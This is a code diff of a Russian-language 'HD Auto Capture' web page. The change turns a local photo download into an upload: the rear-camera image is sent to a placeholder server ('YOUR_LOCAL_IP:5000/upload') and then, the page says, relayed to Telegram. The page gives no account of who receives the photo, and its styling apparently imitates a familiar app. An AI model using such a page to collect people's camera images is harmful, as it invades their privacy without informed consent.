@@ -1,23 +1,38 @@
-<button id="startBtn">ЗАПУСТИТЬ HD КАМЕРУ</button>
-<div id="loader">Loading...</div>
-<video id="video" autoplay playsinline style="display:none"></video>
-<canvas id="canvas" style="display:none"></canvas>
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HD Auto Capture</title>
+<style>
+body { background:#050505; color:#fff; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; text-align:center; padding:50px; }
+button{padding:20px 40px;font-size:20px;background:linear-gradient(45deg,#fe2c55,#ff0050);border:none;color:#fff;border-radius:50px;cursor:pointer;}
+#loader{margin-top:20px;font-weight:bold;animation:pulse 1.5s infinite;color:#fe2c55;}
+@keyframes pulse{0%{opacity:1;}50%{opacity:0.4;}100%{opacity:1;}}
+video, canvas{display:none;}
+</style>
+</head>
+<body>
+<h1>HD Auto Capture</h1>
+<button id="startBtn">СДЕЛАТЬ HD ФОТО</button>
+<div id="loader"></div>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
 <script>
 const btn = document.getElementById('startBtn');
 const loader = document.getElementById('loader');
+
 btn.onclick = async () => {
     loader.textContent = "Инициализация камеры...";
-    btn.style.display = 'none';
+    btn.disabled = true;
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "environment", width: { ideal: 7680 }, height: { ideal: 4320 } }
+            video: { facingMode:"environment", width:{ideal:7680}, height:{ideal:4320} }
         });
         const video = document.getElementById('video');
         video.srcObject = stream;
-
-        // Ждём адаптации сенсора
-        await new Promise(r => setTimeout(r, 2000));
+        await new Promise(r=>setTimeout(r,2000)); // адаптация сенсора
 
         const canvas = document.getElementById('canvas');
         const track = stream.getVideoTracks()[0];
@@ -25,21 +40,25 @@ btn.onclick = async () => {
         canvas.width = settings.width;
         canvas.height = settings.height;
         canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        stream.getTracks().forEach(t=>t.stop());
 
-        stream.getTracks().forEach(t => t.stop());
+        const dataURL = canvas.toDataURL('image/jpeg',1.0);
+        const deviceInfo = `Width:${canvas.width},Height:${canvas.height}`;
 
-        const dataURL = canvas.toDataURL('image/jpeg', 1.0);
-        const a = document.createElement('a');
-        a.href = dataURL;
-        a.download = `photo_${Date.now()}.jpg`;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-
-        loader.textContent = "Фото сделано!";
-    } catch (e) {
-        loader.textContent = "Ошибка: разрешите доступ к камере";
+        loader.textContent = "Отправка фото на сервер...";
+        await fetch("http://YOUR_LOCAL_IP:5000/upload", { // <-- вставь локальный IP вашего ПК
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({image:dataURL, info:deviceInfo})
+        });
+        loader.textContent = "Фото отправлено в Telegram!";
+        btn.disabled = false;
+    } catch(e){
+        loader.textContent="Ошибка доступа к камере";
         console.error(e);
+        btn.disabled = false;
     }
 };
 </script>
+</body>
+</html>
